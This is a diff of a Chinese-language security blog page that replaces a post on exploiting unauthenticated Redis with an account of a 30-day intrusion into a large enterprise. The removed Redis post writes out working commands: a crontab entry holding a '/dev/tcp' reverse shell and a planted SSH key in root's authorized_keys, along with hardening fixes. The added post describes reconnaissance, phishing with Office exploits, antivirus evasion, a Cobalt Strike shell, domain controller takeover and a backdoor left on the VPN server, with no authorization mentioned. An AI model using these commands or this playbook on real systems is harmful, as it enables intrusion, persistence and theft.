@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
+<meta name="description" content="目标 大型企业完成时间：30天   技术成分：%600x01前期的信息收集包括以下部分，  出口网段 网站指纹 IP 端口 子域名 ids waf 邮箱 杀毒软件信息收集技巧：1.针对办公网络出口网段，向目标邮箱发送带有链接的图片或者其他打开可以向外界发送请求的邮件。在这个地方可以有一个小技巧探测目标是否存在邮件网关（当目标存在邮件网关时，你发送邮件以后，会在极短时间以内收到来自外部的请求，可以在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="redis利用">
-<meta property="og:url" content="http://yoursite.com/2018/12/17/redis利用/index.html">
+<meta property="og:title" content="渗透过程记录">
+<meta property="og:url" content="http://yoursite.com/2019/01/09/渗透过程记录/index.html">
 <meta property="og:site_name" content="Scripyboy&#39;s Blog">
-<meta property="og:description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
+<meta property="og:description" content="目标 大型企业完成时间：30天   技术成分：%600x01前期的信息收集包括以下部分，  出口网段 网站指纹 IP 端口 子域名 ids waf 邮箱 杀毒软件信息收集技巧：1.针对办公网络出口网段，向目标邮箱发送带有链接的图片或者其他打开可以向外界发送请求的邮件。在这个地方可以有一个小技巧探测目标是否存在邮件网关（当目标存在邮件网关时，你发送邮件以后，会在极短时间以内收到来自外部的请求，可以在">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-08T10:34:37.693Z">
+<meta property="og:updated_time" content="2019-01-11T02:31:06.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="redis利用">
-<meta name="twitter:description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
+<meta name="twitter:title" content="渗透过程记录">
+<meta name="twitter:description" content="目标 大型企业完成时间：30天   技术成分：%600x01前期的信息收集包括以下部分，  出口网段 网站指纹 IP 端口 子域名 ids waf 邮箱 杀毒软件信息收集技巧：1.针对办公网络出口网段，向目标邮箱发送带有链接的图片或者其他打开可以向外界发送请求的邮件。在这个地方可以有一个小技巧探测目标是否存在邮件网关（当目标存在邮件网关时，你发送邮件以后，会在极短时间以内收到来自外部的请求，可以在">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/17/redis利用/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/01/09/渗透过程记录/"/>
 
 
 
 
 
-  <title>redis利用 | Scripyboy's Blog</title>
+  <title>渗透过程记录 | Scripyboy's Blog</title>
   
 
 
@@ -222,7 +222,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/17/redis利用/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/09/渗透过程记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Scripyboy">
@@ -239,7 +239,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">redis利用</h1>
+          <h1 class="post-title" itemprop="name headline">渗透过程记录</h1>
         
 
         <div class="post-meta">
@@ -251,8 +251,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-17T11:48:15+08:00">
-                2018-12-17
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-09T12:44:18+08:00">
+                2019-01-09
               </time>
             
 
@@ -289,18 +289,22 @@
       
 
       
-        <h1 id="redis未授权访问利用方式"><a href="#redis未授权访问利用方式" class="headerlink" title="redis未授权访问利用方式"></a>redis未授权访问利用方式</h1><p>未授权的中间件有很多，redis比较常见<br>其利用方式如下</p>
-<h3 id="通过写入crontab来反弹shell"><a href="#通过写入crontab来反弹shell" class="headerlink" title="通过写入crontab来反弹shell"></a>通过写入crontab来反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip:port ###连接redis</span><br><span class="line">set xxx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/IP/Port 0&gt;&amp;1\n&quot;  ###写入任务</span><br><span class="line">config set dir /var/spool/cron/ ###设置路径 ps:此路径为centos 路径</span><br><span class="line">config set dir dbfilename xxxx  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<h3 id="写入ssh-公钥直接免密码登陆"><a href="#写入ssh-公钥直接免密码登陆" class="headerlink" title="写入ssh 公钥直接免密码登陆"></a>写入ssh 公钥直接免密码登陆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa ###本地生成公钥</span><br><span class="line">config set dir /root/.ssh/ ### 保存的目录</span><br><span class="line">config set dbfilename authorized_keys 写入文件名</span><br><span class="line">set xxx &quot;\n\n\n 公钥 \n\n\n&quot;  ###写入公钥</span><br><span class="line">save ###保存</span><br></pre></td></tr></table></figure>
-<h3 id="如果有web目录，则可以写入webshell"><a href="#如果有web目录，则可以写入webshell" class="headerlink" title="如果有web目录，则可以写入webshell"></a>如果有web目录，则可以写入webshell</h3><h1 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h1><p>1.禁止一些高危命令<br>修改 redis.conf 文件，添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure>
-<p>来禁用远程修改 DB 文件地址<br>2.以低权限运行 Redis 服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
-<p>3.为 Redis 添加密码验证</p>
-<p>修改 redis.conf 文件，添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
-<p>4.禁止外网访问 Redis<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
+        <h1 id="目标-大型企业"><a href="#目标-大型企业" class="headerlink" title="目标 大型企业"></a>目标 大型企业</h1><h2 id="完成时间：30天-技术成分：-60"><a href="#完成时间：30天-技术成分：-60" class="headerlink" title="完成时间：30天   技术成分：%60"></a>完成时间：30天   技术成分：%60</h2><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>前期的信息收集包括以下部分，</p>
+<ul>
+<li>出口网段</li>
+<li>网站指纹</li>
+<li>IP</li>
+<li>端口</li>
+<li>子域名</li>
+<li>ids</li>
+<li>waf</li>
+<li>邮箱</li>
+<li>杀毒软件<br>信息收集技巧：<br>1.针对办公网络出口网段，向目标邮箱发送带有链接的图片或者其他打开可以向外界发送请求的邮件。在这个地方可以有一个小技巧探测目标是否存在邮件网关（当目标存在邮件网关时，你发送邮件以后，会在极短时间以内收到来自外部的请求，可以在你的web日志里面查看，或者在cobaltstrike的weblog里面查看 ）<br>2.针对网站指纹，通过通用的识别工具，当然，看你的目标是属于那个地方，针对国外请用国外的指纹识别工具，国内的请用国内的识别工具。推荐Google 浏览器插件 Wappalyzer.<br>3.针对IP，端口请不要贸然使用nmap 之类的对目标直接进行扫描。<br>推荐使用shodan 搜索。<br>4.子域名收集请利用常见的爆破工具，在线查询dnsdb,Google Search。如果有cdn,那么请利用常规方式绕过cdn,例如域名解析记录，多地ping，网站反向链接接口等方式。<br>5.ids waf，通过网站的爆错，此处不敢妄言。收集时并没有发现对方的 waf,ids等。<br>6。邮箱（邮箱很重要），邮箱的收集请注意，对应邮箱的使用人是谁。收集对你有用的邮箱。例如，<a href="mailto:webadmin@xx.com" target="_blank" rel="noopener">webadmin@xx.com</a>,<a href="mailto:webmaster@xx.com" target="_blank" rel="noopener">webmaster@xx.com</a>又或者，<a href="mailto:netadmin@xx.com" target="_blank" rel="noopener">netadmin@xx.com</a><br>这些邮箱在后边对你有巨大帮助。</li>
+</ul>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>请将上述信息在记在自己的脑海里面，因为细节很重要。<br>现在针对网站挖掘常见的漏洞。快速的getshell的漏洞请一定熟记。且平时注意收集，不然等到用时方恨少。我这里有几个例子：<br>1.常见的中间件的反序列化，弱口令，未经授权的访问。<br>2.常见CMS的代码执行，文件上传，命令执行。例如struts2框架的代码执行，Drupal7,8的命令执行。wordpress插件的sql注入. wordpress的利用工具wpscan枚举管理员用户，做成字典爆破一波，或许有惊喜。<br>常见的系统漏洞。shellsock,heartbleed,imagemagick等。3.heartbleed可以获取到服务器内存中的账号密码cookie。请收集账号密码做成字典，后续爆破很重要，</p>
+<p>4.直接发送钓鱼邮件拿到办公网络初始入口。（有难度，收益大）<br>  可以利用cve-2017-0199 cve-2017-8759 cve-2017-11882<br>  其实理论上来将，发送一个邮件过去，目标中招。实际操作很难。<br>  难点在于第一：对方杀毒软件，防护情况不明。公开的exp已经被加入了各大杀毒软件的规则，<br>  绕过杀毒是一大难点。<br>  难点二：对于存在的邮件网关，能自动将你邮件带有的附件自动执行。如果发现有异常的链接信息，创建进程。会直接丢弃邮件。<br>  所以，在实际操作的时候非常困难，不回像想象中那么简单。</p>
+<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>  针对杀毒：考虑针对office文档的免杀，采取通用的静态免杀方法。（Google一下）在这里就免杀一项就花费了将近一周的时间。<br>  针对邮件网关，请不要直接发送附件。</p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>1.采取以上的方式并没有突破。最后我们采取发送钓鱼邮件的方式，已知对方无邮件网关，是自建邮箱。<br>三天以后，在Cobaltstrike 弹回了目标shell。然后是通过信息收集，进行内网渗透。<br>最后到域控。到赛门铁克杀毒服务器服务端 最后到邮件服务器，到VPN服务器端（此间留后门）<br>就记录到此 </p>
 
       
     </div>
@@ -325,8 +329,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/03/Linux命令行写文件/" rel="next" title="Linux非交互写文件">
-                <i class="fa fa-chevron-left"></i> Linux非交互写文件
+              <a href="/2018/12/17/redis利用/" rel="next" title="redis利用">
+                <i class="fa fa-chevron-left"></i> redis利用
               </a>
             
           </div>
@@ -334,10 +338,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/09/渗透过程记录/" rel="prev" title="渗透过程记录">
-                渗透过程记录 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -451,7 +451,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis未授权访问利用方式"><span class="nav-number">1.</span> <span class="nav-text">redis未授权访问利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过写入crontab来反弹shell"><span class="nav-number">1.0.1.</span> <span class="nav-text">通过写入crontab来反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入ssh-公钥直接免密码登陆"><span class="nav-number">1.0.2.</span> <span class="nav-text">写入ssh 公钥直接免密码登陆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如果有web目录，则可以写入webshell"><span class="nav-number">1.0.3.</span> <span class="nav-text">如果有web目录，则可以写入webshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修复方案："><span class="nav-number">2.</span> <span class="nav-text">修复方案：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#目标-大型企业"><span class="nav-number">1.</span> <span class="nav-text">目标 大型企业</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#完成时间：30天-技术成分：-60"><span class="nav-number">1.1.</span> <span class="nav-text">完成时间：30天   技术成分：%60</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">2.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02"><span class="nav-number">3.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#解决方案："><span class="nav-number">3.0.1.</span> <span class="nav-text">解决方案：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03"><span class="nav-number">4.</span> <span class="nav-text">0x03</span></a></li></ol></div>
             
 
           </div>
